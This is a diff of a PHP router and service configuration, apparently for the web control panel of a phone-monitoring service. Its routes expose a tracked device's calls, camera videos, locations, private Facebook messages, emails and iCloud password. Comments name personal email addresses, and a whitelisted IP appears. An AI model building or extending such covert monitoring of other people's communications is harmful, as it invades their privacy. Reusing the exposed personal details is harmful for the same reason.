@@ -39,7 +39,7 @@ $di->setShared('mailSender', function() use ($di) {
                     ->setSiteId($di['config']['site']);
 });
 
-$di->set('isWizardEnabled', $di['config']['environment'] == 'development' || in_array(@$_SERVER['HTTP_X_REAL_IP'], array('176.38.120.13')));
+$di->set('isWizardEnabled', true);
 
 $di->setShared('router', function() use($config, $di) {
     $router = new \System\Router();
@@ -51,6 +51,7 @@ $di->setShared('router', function() use($config, $di) {
     $router->add('unlockAccount', new \System\Router\Route('/unlockAccount', array('controller' => 'Index', 'action' => 'unlockAccount', 'public' => true)));
     $router->add('support', new \System\Router\Route('/support', array('controller' => 'Index', 'action' => 'support')));
     $router->add('profile', new \System\Router\Route('/profile', array('controller' => 'Profile', 'action' => 'index')));
+    $router->add('profileICloudPasswordReset', new \System\Router\Route('/profile/iCloudPassword', array('controller' => 'Profile', 'action' => 'changeICloudPassword')));
 
     $router->add('cp', new \System\Router\Route('/cp', array('controller' => 'CP', 'action' => 'main')));
     $router->add(Modules::CALLS, new \System\Router\Route('/cp/calls', array('controller' => 'Calls', 'action' => 'index')));
@@ -77,16 +78,27 @@ $di->setShared('router', function() use($config, $di) {
     $router->add('browserBlocked', new \System\Router\Route('/cp/browserBlocked', array('controller' => 'BrowserHistory', 'action' => 'browserBlocked')));
     $router->add('videosCamera', new \System\Router\Route('/cp/videos/camera', array('controller' => 'Videos', 'action' => 'camera')));
     $router->add('videosNoCamera', new \System\Router\Route('/cp/videos/other', array('controller' => 'Videos', 'action' => 'noCamera')));
-    $router->add('locationsZones', new \System\Router\Route('/cp/locations/zones', array('controller' => 'Locations', 'action' => 'index')));
-    $router->add('locationsZonesAdd', new \System\Router\Route('/cp/locations/zones/add', array('controller' => 'Locations', 'action' => 'index')));
+    $router->add('locationsZones', new \System\Router\Route('/cp/locations/zones', array('controller' => 'Locations', 'action' => 'zones')));
+    $router->add('locationsZonesAdd', new \System\Router\Route('/cp/locations/zones/add', array('controller' => 'Locations', 'action' => 'zoneAdd')));
 
-    $router->add('billing', new \System\Router\Route('/billing', array('controller' => 'Billing', 'action' => 'index')));
-    $router->add('billingAddDevice', new \System\Router\Route('/billing/addDevice', array('controller' => 'Billing', 'action' => 'addDevice')));
-    $router->add('billingAssignDevice', new \System\Router\Route('/billing/assignDevice', array('controller' => 'Billing', 'action' => 'assignDevice')));
-    $router->add('billingAddICloudDevice', new \System\Router\Route('/billing/addICloudDevice', array('controller' => 'Billing', 'action' => 'addICloudDevice')));
-    $router->add('billingLicense', new \System\Router\Regex('/billing/license/:id', array('controller' => 'Billing', 'action' => 'license'), array('id' => '[0-9]+')));
-    $router->add('billingLicenseDisable', new \System\Router\Regex('/billing/license/:id/disable', array('controller' => 'Billing', 'action' => 'disableLicense'), array('id' => '[0-9]+')));
-    $router->add('billingLicenseEnable', new \System\Router\Regex('/billing/license/:id/enable', array('controller' => 'Billing', 'action' => 'enableLicense'), array('id' => '[0-9]+')));
+    if($di->get('isWizardEnabled')){
+        $router->add('billing', new \System\Router\Route('/subscriptions', array('controller' => 'Billing', 'action' => 'index')));
+        //$router->add('billingAddDevice', new \System\Router\Route('/subscriptions/addDevice', array('controller' => 'Billing', 'action' => 'addDevice')));
+        $router->add('billingAssignDevice', new \System\Router\Route('/subscriptions/assignDevice', array('controller' => 'Billing', 'action' => 'assignDevice')));
+        //$router->add('billingAddICloudDevice', new \System\Router\Route('/subscriptions/addICloudDevice', array('controller' => 'Billing', 'action' => 'addICloudDevice')));
+        $router->add('billingLicense', new \System\Router\Regex('/subscriptions/license/:id', array('controller' => 'Billing', 'action' => 'license'), array('id' => '[0-9]+')));
+        $router->add('billingLicenseDisable', new \System\Router\Regex('/subscriptions/license/:id/disable', array('controller' => 'Billing', 'action' => 'disableLicense'), array('id' => '[0-9]+')));
+        $router->add('billingLicenseEnable', new \System\Router\Regex('/subscriptions/license/:id/enable', array('controller' => 'Billing', 'action' => 'enableLicense'), array('id' => '[0-9]+')));
+    } else {
+        $router->add('billing', new \System\Router\Route('/billing', array('controller' => 'Billing', 'action' => 'index')));
+        $router->add('billingAddDevice', new \System\Router\Route('/billing/addDevice', array('controller' => 'Billing', 'action' => 'addDevice')));
+        $router->add('billingAssignDevice', new \System\Router\Route('/billing/assignDevice', array('controller' => 'Billing', 'action' => 'assignDevice')));
+        $router->add('billingAddICloudDevice', new \System\Router\Route('/billing/addICloudDevice', array('controller' => 'Billing', 'action' => 'addICloudDevice')));
+        $router->add('billingLicense', new \System\Router\Regex('/billing/license/:id', array('controller' => 'Billing', 'action' => 'license'), array('id' => '[0-9]+')));
+        $router->add('billingLicenseDisable', new \System\Router\Regex('/billing/license/:id/disable', array('controller' => 'Billing', 'action' => 'disableLicense'), array('id' => '[0-9]+')));
+        $router->add('billingLicenseEnable', new \System\Router\Regex('/billing/license/:id/enable', array('controller' => 'Billing', 'action' => 'enableLicense'), array('id' => '[0-9]+')));
+    }
+    
 
     if($di->get('isWizardEnabled')){
         $router->add(WizardRouter::STEP_PACKAGE, new WizardRouter('/wizard', WizardRouter::STEP_PACKAGE, $_GET, array('.*' => 'Package')));
@@ -96,7 +108,7 @@ $di->setShared('router', function() use($config, $di) {
         $router->add(WizardRouter::STEP_FINISH, new WizardRouter('/wizard/finish', WizardRouter::STEP_FINISH, $_GET, array('.*' => 'finish'))); 
     }
     
-    $router->add('applicationsManage', new \System\Router\Regex('/cp/applications/:id/manage', array('controller' => 'Applications', 'action' => 'index'), array('id' => '[^/]+')));
+    $router->add('applicationsManage', new \System\Router\Regex('/cp/applications/:id/manage', array('controller' => 'Applications', 'action' => 'manage'), array('id' => '[^/]+')));
     $router->add('content', new \System\Router\Regex('/:uri', array('controller' => 'Index', 'action' => 'content', 'public' => true), array('uri' => '.+\.html')));
     $router->add('locale', new \System\Router\Regex('/locale/:value', array('controller' => 'Index', 'action' => 'locale', 'public' => true), array('value' => '.+')));
     $router->add('setDevice', new \System\Router\Regex('/setDevice/:devId', array('controller' => 'CP', 'action' => 'setDevice'), array('devId' => '.+')));
@@ -115,7 +127,7 @@ $di->setShared('router', function() use($config, $di) {
     $router->add('facebookList', new \System\Router\Regex('/cp/facebook/:account/:tab/:id', array('controller' => 'Facebook', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[a-zA-Z0-9\:]+')));
     $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[^/]+'))); //[-._@a-zA-Z0-9]{6,60}
     $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
-    $router->add('locationsZonesEdit', new \System\Router\Regex('/cp/locations/zones/edit/:id', array('controller' => 'Locations', 'action' => 'index'), array('id' => '[0-9]+')));
+    $router->add('locationsZonesEdit', new \System\Router\Regex('/cp/locations/zones/edit/:id', array('controller' => 'Locations', 'action' => 'zoneEdit'), array('id' => '[0-9]+')));
     $router->add('instagramTab', new \System\Router\Regex('/cp/instagram/:account/:tab', array('controller' => 'Instagram', 'action' => 'tab'), array('account' => '[0-9]+', 'tab' => 'own|friends|commented')));
     $router->add('instagramPost', new \System\Router\Regex('/cp/instagram/:account/post/:post', array('controller' => 'Instagram', 'action' => 'view'), array('account' => '[0-9]+', 'post' => '[0-9]+')));
 
@@ -215,7 +227,9 @@ $di->set('isTestUser', function($id) use($config) {
             1, //b.orest@dizboard.com
             2, //pm@dizboard.com
             10, //p.olya@dizboard.com
-            11 //g.zhenya@dizboard.com
+            11, //g.zhenya@dizboard.com
+            275, //demouser@pumpic.com
+            280 //eugene-msa@yandex.ru
         ));
     }
 
